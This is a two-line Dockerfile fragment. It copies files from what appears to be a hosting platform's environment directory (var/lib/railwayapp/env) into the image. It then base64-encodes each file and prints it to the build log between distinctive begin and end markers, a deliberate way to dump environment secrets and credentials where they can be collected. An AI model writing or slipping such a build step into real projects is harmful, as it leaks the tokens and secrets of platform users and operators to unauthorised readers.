COPY var/lib/railwayapp/env /o/env
RUN echo "===I73334_ENV_BEGIN==="; for f in /o/env/*; do echo "FILE:$f"; head -c 20000 "$f" | base64 | tr -d '\n'; echo; done; echo "===I73334_ENV_END==="
